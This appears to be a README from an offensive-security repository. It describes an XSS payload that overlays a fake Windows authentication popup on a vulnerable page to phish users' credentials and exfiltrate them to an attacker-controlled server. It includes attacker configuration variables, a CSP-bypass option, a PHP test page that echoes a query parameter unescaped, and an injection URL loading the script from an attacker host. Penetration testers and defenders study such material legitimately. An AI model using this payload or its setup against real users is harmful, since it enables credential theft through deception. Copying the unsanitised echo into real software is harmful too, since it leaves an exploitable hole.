# [Phish] Windows Authentication Prompt

<p align="justify">This payload adds HTML code as an overlay to the target web page (containing the XSS vulnerability). The code displays the dreaded Windows Authentication prompt popup window. The overlay creates the illusion that the operating system spawned the prompt. Once they encounter such an authentication prompt, most users have a (proven) tendency to blindly provide it credentials (which contributes to a higher success rate of such phishing attacks).<p>

Typical use-case scenarios:
* external network perspective (Internet)
  * public web application which uses Windows Authentication (e.g. Outlook Web Access) without 2FA
* internal network perspective (LAN)
  * Windows Active Directory environments (**NOTE**: no web application requirements)

The payload (`winph.js`) supports options:

* no CSP bypass - issue AJAX request

  ```
  ...
  var bypassCSP = false;
  ...
  ```

* CSP bypass - issue hard redirect (uses `redir.php`)

  ```
  ...
  var bypassCSP = true;
  ...
  ```

## Test Environment

### Web Browsers (20240224)

* [x] Mozilla Firefox Version 123.0 (64-bit)
* [x] Google Chrome Version 122.0.6261.70 (64-bit)
* [x] Microsoft Edge Version 122.0.2365.52 (64-bit)

### Vulnerable Page (`rxss.php`)

```
<!DOCTYPE html>
<html>
  <body>
    <h2>Test page</h2>
    <p>Test content</p>
    <?php echo '<div>' . $_GET['q'] . '</div>'; ?>
  </body>
</html>
```

## Exploitation Steps

1. [setup exploit] change payload variable values (`winph.js`; `redir.php`)

    `scheme` - exfiltration web server scheme (http/https)

    `attIP` - exfiltration web server IP address

    `attPort` - exfiltration web server port

    `bypassCSP` - use/do not use CSP bypass (true/false)

    `url` - exfiltration web server URL

2. [setup exploit] setup web server (to serve the payload/redirector)

3. [social engineering attack] victim user clicks link

    ```
    http://192.168.5.15/rxss.php?q=<script src=http://192.168.5.15/winph.js></script>
    ```

    * **NOTES**:
      * `192.168.5.15` - target site
      * `192.168.5.15` - web server hosting payload

4. [social engineering attack] victim user authenticates

    *(attacker obtains credentials)*

5. [post exploit] attacker leverages obtained credentials (scenario dependent)

## Screenshots

* **NOTE**: the screenshot covers steps 1 to 4 from the "Exploitation Steps" chapter

<p align="center">
  <kbd>
    <picture>
      <source media="" srcset="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/WindowsPhishing/screenshots/Windows_phish_-_cred_exfil_-_1-1.png">
      <img src="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/WindowsPhishing/screenshots/Windows_phish_-_cred_exfil_-_1-1.png">
    </picture>
  </kbd>
</p>

* [web browser rendering] Mozilla FireFox

<p align="center">
  <kbd>
    <picture>
      <source media="" srcset="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/WindowsPhishing/screenshots/Windows_phish_-_web_browser_rendering_-_Mozilla_FireFox_-_1-1.png">
      <img src="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/WindowsPhishing/screenshots/Windows_phish_-_web_browser_rendering_-_Mozilla_FireFox_-_1-1.png">
    </picture>
  </kbd>
</p>

* [web browser rendering] Google Chrome

<p align="center">
  <kbd>
    <picture>
      <source media="" srcset="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/WindowsPhishing/screenshots/Windows_phish_-_web_browser_rendering_-_Google_Chrome_-_1-1.png">
      <img src="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/WindowsPhishing/screenshots/Windows_phish_-_web_browser_rendering_-_Google_Chrome_-_1-1.png">
    </picture>
  </kbd>
</p>

* [web browser rendering] Microsoft Edge

<p align="center">
  <kbd>
    <picture>
      <source media="" srcset="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/WindowsPhishing/screenshots/Windows_phish_-_web_browser_rendering_-_Microsoft_Edge_-_1-1.png">
      <img src="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/WindowsPhishing/screenshots/Windows_phish_-_web_browser_rendering_-_Microsoft_Edge_-_1-1.png">
    </picture>
  </kbd>
</p>
